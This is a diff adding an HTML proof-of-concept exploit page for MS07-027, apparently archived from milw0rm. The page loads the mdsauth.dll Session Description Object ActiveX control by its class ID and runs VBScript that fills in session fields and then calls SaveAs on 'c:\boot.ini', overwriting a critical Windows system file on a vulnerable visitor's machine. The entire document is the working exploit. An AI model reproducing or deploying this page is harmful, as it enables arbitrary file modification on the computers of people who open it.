@@ -1,0 +1,20 @@
+<html>
+<title> MS07-027 mdsauth.dll NMSA Session Description Object SaveAs control, arbitrary file modification </title>
+<body>
+
+<OBJECT id="target" classid="clsid:d4fe6227-1288-11d0-9097-00aa004254a0"> 
+
+</OBJECT>
+<script language="vbscript">
+//next script is converted to UTF16
+ target.SessionDescription="MS07-027 mdsauth.dll Proof of Concept exploit"
+ target.SessionAuthor="Andres Tarasco Acuna"
+ target.SessionEmailContact="atarasco_at_gmail.com"
+ target.SessionURL="http://www.514.es"
+ target.SaveAs "c:\boot.ini"
+</script>
+
+</body>
+</html>
+
+# milw0rm.com [2007-05-10]
